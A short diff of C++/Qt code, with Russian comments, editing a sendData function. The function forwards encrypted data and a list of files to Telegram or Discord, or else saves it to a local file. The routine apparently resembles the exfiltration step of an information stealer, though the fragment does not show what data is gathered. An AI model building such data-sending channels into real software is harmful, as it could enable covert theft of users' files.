@@ -1800,16 +1800,13 @@ void MainWindow::sendToDiscord(const std::string& data, const std::vector<std::s
 // Реализация sendData
 void MainWindow::sendData(const QString& encryptedData, const std::vector<std::string>& files) {
     emitLog("Подготовка данных для отправки...");
-
     std::string data = encryptedData.toStdString();
-
-    // Выбираем метод отправки
     if (config.sendMethod == "Telegram") {
         sendToTelegram(data, files);
     } else if (config.sendMethod == "Discord") {
         sendToDiscord(data, files);
     } else {
-        saveToLocalFile(data, "output");
+        saveToLocalFile(data, "output"); // Фиксированная директория
     }
 }
 
